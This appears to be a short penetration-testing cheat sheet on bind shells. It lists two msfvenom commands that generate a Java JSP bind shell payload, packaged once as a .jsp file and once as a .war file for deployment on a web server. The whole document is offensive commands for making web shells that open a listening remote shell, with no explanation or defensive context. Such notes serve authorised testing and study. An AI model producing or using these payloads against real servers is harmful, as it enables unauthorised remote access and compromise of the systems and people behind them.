# Bind Shells

## 01 - JSP

```
$ msfvenom -p java/jsp_shell_bind_tcp lport=<PORT> -f raw -o shell.jsp
```

## 02 - WAR

```
$ msfvenom -p java/jsp_shell_bind_tcp lport=<PORT> -f raw -o shell.war
```